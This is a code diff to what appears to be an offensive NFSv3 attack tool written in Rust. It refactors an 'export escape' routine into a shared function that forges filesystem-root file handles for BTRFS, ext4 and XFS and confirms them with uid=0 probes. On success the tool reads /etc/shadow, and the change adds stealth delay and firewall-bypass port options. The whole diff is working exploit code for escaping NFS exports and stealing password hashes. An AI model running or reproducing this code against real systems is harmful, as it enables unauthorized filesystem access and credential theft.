@@ -13,9 +13,9 @@
 use clap::Parser;
 use colored::Colorize as _;
 
-use crate::cli::probe::{make_client, make_mount_client, parse_addr};
+use crate::cli::probe::{make_client, make_mount_client, parse_addr_with_port};
 use crate::cli::{GlobalOpts, H_BEHAVIOR, H_TARGET};
-use crate::engine::file_handle::FileHandleAnalyzer;
+use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer};
 use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::nfs3::client::Nfs3Client;
 use crate::proto::nfs3::types::FileHandle;
@@ -52,14 +52,46 @@ pub struct EscapeArgs {
     pub export: Option<String>,
 
     /// Number of BTRFS subvolume IDs to try (starting at 256)
-    #[arg(long, default_value = "16", value_name = "N", help_heading = H_BEHAVIOR)]
+    #[arg(long, default_value_t = DEFAULT_BTRFS_SUBVOLS, value_name = "N", help_heading = H_BEHAVIOR)]
     pub btrfs_subvols: u32,
 
     /// Inode scan depth for the fallback brute-force pass.
     /// The root inode is always within the first 200 inodes on any Linux
     /// filesystem, so the default covers all practical cases.
-    #[arg(long, default_value = "200", value_name = "N", help_heading = H_BEHAVIOR)]
+    #[arg(long, default_value_t = DEFAULT_MAX_ROOT_SCAN, value_name = "N", help_heading = H_BEHAVIOR)]
     pub max_root_scan: u32,
+}
+
+/// Default BTRFS subvolume scan count. Shared with `scan --auto-escape` so the
+/// auto pass uses the same depth as a manual `escape` invocation.
+pub const DEFAULT_BTRFS_SUBVOLS: u32 = 16;
+
+/// Default inode-scan depth for the escape fallback pass. The root inode is
+/// always within the first 200 inodes on any Linux filesystem. Shared with
+/// `scan --auto-escape`.
+pub const DEFAULT_MAX_ROOT_SCAN: u32 = 200;
+
+/// Outcome of an escape attempt against a single export.
+///
+/// Returned by [`find_escape`] so callers decide how to render it: the `escape`
+/// subcommand prints a verbose report (and reads /etc/shadow on success), while
+/// `scan --auto-escape` prints a one-line-per-export summary.
+#[derive(Debug)]
+pub enum EscapeOutcome {
+    /// A filesystem-root handle was constructed and verified live (GETATTR
+    /// returned NFS3_OK on a directory, or ACCES -- format accepted).
+    Success {
+        /// The verified root handle plus its filesystem fingerprint.
+        candidate: EscapeResult,
+        /// How the handle was found (e.g. "verified", "found via scan").
+        note: String,
+    },
+    /// Handle format is valid (STALE hits) but the root inode was not found
+    /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
+    StaleNoRoot,
+    /// The server rejected the handle format entirely (BADHANDLE): the export
+    /// is not escapable with this technique (non-Linux server, signed handles).
+    Unsupported,
 }
 
 /// Run the escape command.
@@ -83,16 +115,48 @@ pub async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Result<()> {
 /// being shown. ACCES counts as a hit -- the handle format is valid; only the
 /// credential is rejected.
 async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
-    use nfs3_types::nfs3::nfsstat3;
     eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
-    let addr = parse_addr(host)?;
+    let (probe_client, outcome) = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await?;
+    match outcome {
+        EscapeOutcome::Success { candidate, note } => {
+            print_escape_success(&candidate, &note, host);
+            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
+        },
+        EscapeOutcome::StaleNoRoot => {
+            eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
+        },
+        EscapeOutcome::Unsupported => {
+            eprintln!("{}", crate::output::status_err("Export escape not supported for this filesystem / handle format (BADHANDLE)"));
+        },
+    }
+    Ok(())
+}
+
+/// Shared export-escape primitive behind both `escape` and `scan --auto-escape`.
+///
+/// Mounts `host:export`, builds a uid=0 probe client, and searches for a working
+/// filesystem-root handle (BTRFS subvolumes, then ext4/XFS known inodes, then a
+/// fallback inode scan). Returns the probe client -- so the caller can perform
+/// post-escape reads such as /etc/shadow -- together with the [`EscapeOutcome`].
+///
+/// uid=0 keeps permission errors (squashed root) distinguishable from format
+/// errors (STALE/BADHANDLE); the handle is a bearer token, so any later
+/// credential works with it (RFC 1094 S2.3.3).
+///
+/// Per-candidate progress lines are written to stderr only when `announce` is
+/// set. Bulk callers (`scan --auto-escape`) pass `false` and print their own
+/// one-line-per-export summary instead.
+pub async fn find_escape(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<(Nfs3Client, EscapeOutcome)> {
+    use nfs3_types::nfs3::nfsstat3;
+    let addr = parse_addr_with_port(host, globals.nfs_port)?;
     let mount = make_mount_client(globals);
     let mnt = mount.mount(addr, export).await?;
 
-    // Use uid=0 for probes so permission errors (squashed root) are distinguishable
-    // from format errors (STALE/BADHANDLE). The handle is a bearer token; once we
-    // have it the caller can use any credential (RFC 1094 S2.3.3).
-    let (_, _, probe_client) = make_client(addr, export, 0, 0, &[], StealthConfig::new(0, 0), globals.proxy.as_deref());
+    // Honour the global stealth delay on the probe path (every RPC path must
+    // respect StealthConfig); with the default --delay 0 this is a no-op.
+    // `globals.nfs_port` routes the probe client straight to the NFS port when
+    // portmapper is firewalled.
+    let (_, _, probe_client) = make_client(addr, export, 0, 0, &[], StealthConfig::new(globals.delay, globals.jitter), globals.proxy.as_deref(), globals.nfs_port);
 
     // --- Phase 1: known root inodes for the detected filesystem type ---
 
@@ -103,13 +167,11 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
     let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&mnt.handle, btrfs_subvols);
     let mut announced = std::collections::HashSet::with_capacity(btrfs.len());
     for candidate in &btrfs {
-        if announced.insert(candidate.inode_number) {
+        if announce && announced.insert(candidate.inode_number) {
             eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
         }
         if probe_escape_candidate(&probe_client, candidate).await {
-            print_escape_success(candidate, "subvolume (verified)", host);
-            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
-            return Ok(());
+            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified)".to_owned() }));
         }
     }
 
@@ -117,7 +179,7 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
     // Fingerprint first so we don't try XFS inodes on ext4 (inode 128 on ext4 is
     // a real but non-root file; accepting it would give a misleading "escape").
     let fs_type = FileHandleAnalyzer::fingerprint_fs(&mnt.handle);
-    let known: Vec<crate::engine::file_handle::EscapeResult> = match fs_type {
+    let known: Vec<EscapeResult> = match fs_type {
         crate::engine::file_handle::FsType::Xfs => FileHandleAnalyzer::construct_xfs_escape_candidates(&mnt.handle),
         crate::engine::file_handle::FsType::Unknown | crate::engine::file_handle::FsType::Ext4 => {
             // Unknown: compound UUID format -- ambiguous ext4/XFS; try all candidates.
@@ -133,16 +195,16 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
     };
 
     for candidate in &known {
-        eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
+        if announce {
+            eprintln!("{}", crate::output::status_info(&format!("Probing {:?} inode {} ...", candidate.fs_type, candidate.inode_number)));
+        }
         if probe_escape_candidate(&probe_client, candidate).await {
-            print_escape_success(candidate, "verified", host);
-            try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
-            return Ok(());
+            return Ok((probe_client, EscapeOutcome::Success { candidate: candidate.clone(), note: "verified".to_owned() }));
         }
     }
 
     // --- Phase 2: fallback scan (inodes 2..=max_root_scan) ---
-    if !known.is_empty() {
+    if announce && !known.is_empty() {
         eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- scanning inodes 2..={max_root_scan}")));
     }
 
@@ -157,17 +219,13 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
         let args = nfs3_types::nfs3::GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
         match probe_client.getattr(&args).await {
             Ok(Nfs3Result::Ok(ok)) if ok.obj_attributes.type_ == nfs3_types::nfs3::ftype3::NF3DIR => {
-                print_escape_success(&candidate, "found via scan", host);
-                try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
-                return Ok(());
+                return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan".to_owned() }));
             },
             Ok(Nfs3Result::Ok(_)) => {
                 tracing::debug!(inode, "scan hit non-directory inode (within export subtree)");
             },
             Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_ACCES | nfsstat3::NFS3ERR_PERM, _))) => {
-                print_escape_success(&candidate, "found via scan (ACCES -- root_squash active)", host);
-                try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
-                return Ok(());
+                return Ok((probe_client, EscapeOutcome::Success { candidate, note: "found via scan (ACCES -- root_squash active)".to_owned() }));
             },
             Ok(Nfs3Result::Err((nfsstat3::NFS3ERR_STALE, _))) => {
                 found_stale = true;
@@ -182,12 +240,8 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
         }
     }
 
-    if found_stale {
-        eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
-    } else {
-        eprintln!("{}", crate::output::status_err("Export escape not supported for this filesystem / handle format (BADHANDLE)"));
-    }
-    Ok(())
+    let outcome = if found_stale { EscapeOutcome::StaleNoRoot } else { EscapeOutcome::Unsupported };
+    Ok((probe_client, outcome))
 }
 
 /// Probe a candidate handle with GETATTR and report whether it is a valid directory.
@@ -198,7 +252,7 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
 ///   exist (on ext4, inode 128 is the journal file, not a directory).
 /// - `NFS3ERR_ACCES` / `NFS3ERR_PERM` -- handle format was accepted (root_squash
 ///   blocks uid=0 reads on the root dir).
-async fn probe_escape_candidate(client: &Nfs3Client, candidate: &crate::engine::file_handle::EscapeResult) -> bool {
+async fn probe_escape_candidate(client: &Nfs3Client, candidate: &EscapeResult) -> bool {
     use nfs3_types::nfs3::{GETATTR3args, ftype3, nfsstat3};
     let args = GETATTR3args { object: candidate.root_handle.to_nfs_fh3() };
     match client.getattr(&args).await {
@@ -209,7 +263,7 @@ async fn probe_escape_candidate(client: &Nfs3Client, candidate: &crate::engine::
 }
 
 /// Print the successful escape result and next-step hints.
-fn print_escape_success(candidate: &crate::engine::file_handle::EscapeResult, note: &str, host: &str) {
+fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
     let hex = candidate.root_handle.to_hex();
     println!();
     println!("  {}  {:?}  (inode {}  {})", "Filesystem:".dimmed(), candidate.fs_type, candidate.inode_number, note);
